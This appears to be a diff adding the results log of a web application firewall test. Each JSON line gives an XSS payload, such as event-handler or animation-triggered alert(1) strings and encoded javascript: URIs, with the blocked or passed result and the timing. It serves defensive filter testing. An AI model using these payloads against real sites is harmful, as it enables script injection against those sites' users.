@@ -1,0 +1,500 @@
+{"payload": "<figcaption onmouseout=\"alert(1)\">test</figcaption>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006912304001161829}
+{"payload": "<slot onbeforepaste=\"alert(1)\" contenteditable>test</slot>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003259134988184087}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><details ondrop=alert(1) contenteditable>drop here</details>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003558754993719049}
+{"payload": "<input autofocus onfocusin=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034114699956262484}
+{"payload": "<rt onmouseout=\"alert(1)\">test</rt>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003276408009696752}
+{"payload": "<sup onmouseover=\"alert(1)\">test</sup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030204429931472987}
+{"payload": "<thead onbeforecopy=\"alert(1)\" contenteditable>test</thead>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003059848997509107}
+{"payload": "<kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032831819989951327}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><kbd ondrop=alert(1) contenteditable>drop here</kbd>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034444739867467433}
+{"payload": "<tfoot onmouseleave=\"alert(1)\">test</tfoot>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032515810016775504}
+{"payload": "<style>@keyframes x{}</style><hr style=\"animation-name:x\" onanimationstart=\"alert(1)\"></hr>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003427371004363522}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable>drop here</sup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031050870020408183}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><samp ondragover=alert(1) contenteditable>drop here</samp>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004013699013739824}
+{"payload": "<svg><q onload=alert(1)></q>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003134223006782122}
+{"payload": "<dl onkeyup=\"alert(1)\" contenteditable>test</dl>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003114844992524013}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><var ondragover=alert(1) contenteditable>drop here</var>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003098033004789613}
+{"payload": "<dir onmousedown=\"alert(1)\">test</dir>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032507790019735694}
+{"payload": "<meter draggable=\"true\" ondragstart=\"alert(1)\">test</meter>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00309747300343588}
+{"payload": "<rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034254969941684976}
+{"payload": "<bgsound ondblclick=\"alert(1)\">test</bgsound>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029898130014771596}
+{"payload": "<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003185072011547163}
+{"payload": "<body onorientationchange=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031508760002907366}
+{"payload": "<meta id=x tabindex=1 onactivate=alert(1)></meta>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002953414004878141}
+{"payload": "<dd draggable=\"true\" ondragleave=\"alert(1)\">test</dd>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029353970021475106}
+{"payload": "<base onkeydown=\"alert(1)\" contenteditable>test</base>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030789059965172783}
+{"payload": "<svg><center onload=alert(1)></center>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029630720091518015}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><td ondrop=alert(1) contenteditable>drop here</td>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029406879912130535}
+{"payload": "<font oncontextmenu=\"alert(1)\">test</font>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002823300994350575}
+{"payload": "<xmp id=x tabindex=1 onactivate=alert(1)></xmp>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003080128997680731}
+{"payload": "<figcaption id=x tabindex=1 onbeforeactivate=alert(1)></figcaption>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0027494969981489703}
+{"payload": "<ol oncut=\"alert(1)\" contenteditable>test</ol>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002641878993017599}
+{"payload": "<optgroup onpaste=\"alert(1)\" contenteditable>test</optgroup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029480520024662837}
+{"payload": "<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002846125003998168}
+{"payload": "<html onmouseover=\"alert(1)\">test</html>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0027928030031034723}
+{"payload": "<sup draggable=\"true\" ondragleave=\"alert(1)\">test</sup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00307394600531552}
+{"payload": "<var onbeforepaste=\"alert(1)\" contenteditable>test</var>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031418670114362612}
+{"payload": "<area onkeydown=\"alert(1)\" contenteditable>test</area>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031080820044735447}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><caption id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></caption>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003256310010328889}
+{"payload": "<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030851289920974523}
+{"payload": "<IMG SRC='vbscript:msgbox(\"XSS\")'>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003003099001944065}
+{"payload": "<sub onmouseenter=\"alert(1)\">test</sub>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002862856999854557}
+{"payload": "<p onkeypress=\"alert(1)\" contenteditable>test</p>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003309742998681031}
+{"payload": "<style>:target {color:red;}</style><noscript id=x style=\"transition:color 1s\" ontransitionend=alert(1)></noscript>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033693680015858263}
+{"payload": "<title draggable=\"true\" ondragend=\"alert(1)\">test</title>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029483039979822934}
+{"payload": "\"onmouseover=alert(1)//", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002973410999402404}
+{"payload": "<u onmouseover=\"alert(1)\">test</u>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002804854986607097}
+{"payload": "<hgroup onbeforecut=\"alert(1)\" contenteditable>test</hgroup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029763269994873554}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><area ondragover=alert(1) contenteditable>drop here</area>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003083365998463705}
+{"payload": "<option draggable=\"true\" ondrag=\"alert(1)\">test</option>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00284268798714038}
+{"payload": "<script onfocusout=alert(1) tabindex=1 id=x></script><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002963731996715069}
+{"payload": "<form draggable=\"true\" ondragend=\"alert(1)\">test</form>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030435570079134777}
+{"payload": "<style>:target {color: red;}</style><head id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></head>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00339258300664369}
+{"payload": "<head draggable=\"true\" ondragenter=\"alert(1)\">test</head>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002850664997822605}
+{"payload": "<blink onmouseover=\"alert(1)\">test</blink>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002787460995023139}
+{"payload": "<option onkeypress=\"alert(1)\" contenteditable>test</option>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002912232987000607}
+{"payload": "<tfoot id=x tabindex=1 onbeforeactivate=alert(1)></tfoot>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028309150075074285}
+{"payload": "<dd onkeypress=\"alert(1)\" contenteditable>test</dd>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0027995250129606575}
+{"payload": "<meter onbeforecopy=\"alert(1)\" contenteditable>test</meter>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0039003989950288087}
+{"payload": "<q oncut=\"alert(1)\" contenteditable>test</q>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005282555997837335}
+{"payload": "<dir id=x tabindex=1 onbeforeactivate=alert(1)></dir>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038088600122136995}
+{"payload": "<ruby ondblclick=\"alert(1)\">test</ruby>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003070008009672165}
+{"payload": "<div id=\"53\"><xml id=\"xss\" src=\"test.htc\"></xml>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004134882998187095}
+{"payload": "<blockquote onbeforepaste=\"alert(1)\" contenteditable>test</blockquote>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036992480017943308}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable>drop here</aside>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032359100005123764}
+{"payload": "<style>@keyframes x{}</style><spacer style=\"animation-name:x\" onanimationstart=\"alert(1)\"></spacer>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003153280005790293}
+{"payload": "<link rel=stylesheet href=1 onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031629380100639537}
+{"payload": "<element onbeforecut=\"alert(1)\" contenteditable>test</element>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029339860047912225}
+{"payload": "<nobr draggable=\"true\" ondragleave=\"alert(1)\">test</nobr>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028668199956882745}
+{"payload": "<canvas draggable=\"true\" ondragstart=\"alert(1)\">test</canvas>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002903669999795966}
+{"payload": "<listing onmouseup=\"alert(1)\">test</listing>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003697344000102021}
+{"payload": "<command oncopy=\"alert(1)\" contenteditable>test</command>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030688510014442727}
+{"payload": "<style>@keyframes slidein {}</style><command style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></command>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003141031993436627}
+{"payload": "<style>@keyframes slidein {}</style><form style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></form>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003121638990705833}
+{"payload": "<style>@keyframes x{}</style><col style=\"animation-name:x\" onanimationend=\"alert(1)\"></col>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029504970007110387}
+{"payload": "<output onmousemove=\"alert(1)\">test</output>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002892268996220082}
+{"payload": "<style>@keyframes slidein {}</style><hr style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></hr>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003343804011819884}
+{"payload": "<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031129330018302426}
+{"payload": "<header onmouseup=\"alert(1)\">test</header>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002905810993979685}
+{"payload": "<del onbeforepaste=\"alert(1)\" contenteditable>test</del>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028589499997906387}
+{"payload": "<style>@keyframes slidein {}</style><multicol style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></multicol>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028600270015886053}
+{"payload": "<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00312925799516961}
+{"payload": "<embed id=x onfocusin=alert(1) type=text/html>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030421949923038483}
+{"payload": "<noframes onbeforecut=\"alert(1)\" contenteditable>test</noframes>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028247139998711646}
+{"payload": "<s onmouseover=\"alert(1)\">test</s>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002913014992373064}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><small id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></small>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003060390008613467}
+{"payload": "<tt onpaste=\"alert(1)\" contenteditable>test</tt>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032864589884411544}
+{"payload": "<map onblur=alert(1) tabindex=1 id=x></map><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002895190002163872}
+{"payload": "<multicol onmousemove=\"alert(1)\">test</multicol>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0027569819940254092}
+{"payload": "<style>@keyframes slidein {}</style><article style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></article>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003195881989086047}
+{"payload": "<input type=image src=1 onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029321210022317246}
+{"payload": "<audio autoplay controls onseeking=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003389858000446111}
+{"payload": "<dl onmouseover=\"alert(1)\">test</dl>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002928986999904737}
+{"payload": "<marquee oncut=\"alert(1)\" contenteditable>test</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0027415320073487237}
+{"payload": "<dir onbeforecopy=\"alert(1)\" contenteditable>test</dir>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002963065999210812}
+{"payload": "<keygen onmousemove=\"alert(1)\">test</keygen>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003072357998462394}
+{"payload": "<%", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.019006649003131315}
+{"payload": "<multicol onkeypress=\"alert(1)\" contenteditable>test</multicol>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003992306999862194}
+{"payload": "<style>@keyframes x{}</style><dt style=\"animation-name:x\" onanimationend=\"alert(1)\"></dt>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003784091997658834}
+{"payload": "<ol id=x tabindex=1 onfocus=alert(1)></ol>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035015949979424477}
+{"payload": "<u onbeforepaste=\"alert(1)\" contenteditable>test</u>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034083329956047237}
+{"payload": "<figure onkeypress=\"alert(1)\" contenteditable>test</figure>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036394079943420365}
+{"payload": "<noscript id=x tabindex=1 onbeforedeactivate=alert(1)></noscript><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00360532000195235}
+{"payload": "<x contenteditable oninput=alert(1)>input here!", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003355517008458264}
+{"payload": "<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034907530061900616}
+{"payload": "<style>@keyframes slidein {}</style><tbody style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></tbody>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005073036008980125}
+{"payload": "<spacer onmousedown=\"alert(1)\">test</spacer>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007017066003754735}
+{"payload": "<head onbeforecopy=\"alert(1)\" contenteditable>test</head>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005820728998514824}
+{"payload": "<svg><span onload=alert(1)></span>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004044318004162051}
+{"payload": "<xss id=x tabindex=1 onactivate=alert(1)></xss>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003443241002969444}
+{"payload": "<listing draggable=\"true\" ondragend=\"alert(1)\">test</listing>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037344759912230074}
+{"payload": "<style>@keyframes x{}</style><label style=\"animation-name:x\" onanimationend=\"alert(1)\"></label>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038816809974377975}
+{"payload": "<nav onmouseleave=\"alert(1)\">test</nav>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003341054994962178}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><basefont ondragover=alert(1) contenteditable>drop here</basefont>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035815890005324036}
+{"payload": "<meter onclick=\"alert(1)\">test</meter>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034563369990792125}
+{"payload": "<i onmousedown=\"alert(1)\">test</i>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003792518997215666}
+{"payload": "<frameset><frame id=x onfocusin=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003508369001792744}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><col ondrop=alert(1) contenteditable>drop here</col>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036582579923560843}
+{"payload": "<slot ondblclick=\"alert(1)\">test</slot>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036059460107935593}
+{"payload": "<style>@keyframes slidein {}</style><bdo style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></bdo>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036134170077275485}
+{"payload": "<input type=image src=validimage.png onload=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038239959976635873}
+{"payload": "<style>@keyframes slidein {}</style><link style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></link>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038429360138252378}
+{"payload": "<main id=x tabindex=1 onbeforeactivate=alert(1)></main>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034256379876751453}
+{"payload": "<progress draggable=\"true\" ondrag=\"alert(1)\">test</progress>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003498188001685776}
+{"payload": "<picture><source srcset=\"validimage.png\"><image onloadstart=alert(1)></picture>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004133160007768311}
+{"payload": "<acronym onpaste=\"alert(1)\" contenteditable>test</acronym>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035478290083119646}
+{"payload": "<root/>//[\"'`-->]]>]</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033985299960477278}
+{"payload": "<style>:target {color: red;}</style><title id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></title>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003674128995044157}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><marquee id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038994409987935796}
+{"payload": "<param onmouseup=\"alert(1)\">test</param>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003504506006720476}
+{"payload": "<x contenteditable onblur=alert(1)>lose focus!", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035652380029205233}
+{"payload": "<style>@keyframes x{}</style><tbody style=\"animation-name:x\" onanimationstart=\"alert(1)\"></tbody>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003533260998665355}
+{"payload": "<style>@keyframes x{}</style><nav style=\"animation-name:x\" onanimationstart=\"alert(1)\"></nav>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003620409988798201}
+{"payload": "<title id=x tabindex=1 onbeforeactivate=alert(1)></title>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035259030119050294}
+{"payload": "<object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033120570005849004}
+{"payload": "<tfoot onbeforecopy=\"alert(1)\" contenteditable>test</tfoot>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034185339900432155}
+{"payload": "<acronym id=x tabindex=1 onfocus=alert(1)></acronym>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036598709993995726}
+{"payload": "<menu onclick=\"alert(1)\">test</menu>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003234318006434478}
+{"payload": "<style>@keyframes slidein {}</style><spacer style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></spacer>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035857089969795197}
+{"payload": "<dir ondblclick=\"alert(1)\">test</dir>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033600900060264394}
+{"payload": "<listing onmouseenter=\"alert(1)\">test</listing>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003286839011707343}
+{"payload": "<rb onbeforepaste=\"alert(1)\" contenteditable>test</rb>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005410483994637616}
+{"payload": "a=alert,a(1)", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.012329980992944911}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004243489005602896}
+{"payload": "<video id=x controls onfocusin=alert(1)><source src=\"validvideo.mp4\" type=video/mp4></video>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038613119977526367}
+{"payload": "<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003679143002955243}
+{"payload": "<mark draggable=\"true\" ondragstart=\"alert(1)\">test</mark>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035368240060051903}
+{"payload": "<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003402718997676857}
+{"payload": "<svg><big onload=alert(1)></big>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033050280035240576}
+{"payload": "<ul onkeydown=\"alert(1)\" contenteditable>test</ul>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003505718006636016}
+{"payload": "<col id=x tabindex=1 onbeforedeactivate=alert(1)></col><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033628899982431903}
+{"payload": "<bdi onkeypress=\"alert(1)\" contenteditable>test</bdi>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035914509935537353}
+{"payload": "<embed id=x tabindex=1 onactivate=alert(1)></embed>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033778859942685813}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><time ondragover=alert(1) contenteditable>drop here</time>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034568879927974194}
+{"payload": "<meta onmouseleave=\"alert(1)\">test</meta>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033291600120719522}
+{"payload": "<progress onbeforepaste=\"alert(1)\" contenteditable>test</progress>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005875265997019596}
+{"payload": "<sub onbeforepaste=\"alert(1)\" contenteditable>test</sub>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0048465310101164505}
+{"payload": "<time oncut=\"alert(1)\" contenteditable>test</time>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00483547399926465}
+{"payload": "<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004874981998000294}
+{"payload": "<address onkeyup=\"alert(1)\" contenteditable>test</address>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004196952999336645}
+{"payload": "<main onbeforecopy=\"alert(1)\" contenteditable>test</main>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032430330029455945}
+{"payload": "<html onmouseenter=\"alert(1)\">test</html>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003441488996031694}
+{"payload": "<body draggable=\"true\" ondragenter=\"alert(1)\">test</body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038322659966070205}
+{"payload": "<samp oncut=\"alert(1)\" contenteditable>test</samp>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003622700009145774}
+{"payload": "<s onmouseleave=\"alert(1)\">test</s>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00338905600074213}
+{"payload": "<b onmouseover=\"alert(1)\">test</b>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033291400031885132}
+{"payload": "<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003581629993277602}
+{"payload": "<body onhashchange=\"alert(1)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036881879932479933}
+{"payload": "<acronym onmouseenter=\"alert(1)\">test</acronym>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003721290995599702}
+{"payload": "<template onkeyup=\"alert(1)\" contenteditable>test</template>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038969209999777377}
+{"payload": "<style id=x tabindex=1 onactivate=alert(1)></style>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0050677499966695905}
+{"payload": "<style>@keyframes x{}</style><isindex style=\"animation-name:x\" onanimationstart=\"alert(1)\"></isindex>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004697975004091859}
+{"payload": "<style>:target {color:red;}</style><plaintext id=x style=\"transition:color 1s\" ontransitionend=alert(1)></plaintext>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004719434000435285}
+{"payload": "<img src=`xx:xx`onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004343054999480955}
+{"payload": "<video onbeforecopy=\"alert(1)\" contenteditable>test</video>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004763311007991433}
+{"payload": "<svg><xss onload=alert(1)></xss>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004080597005668096}
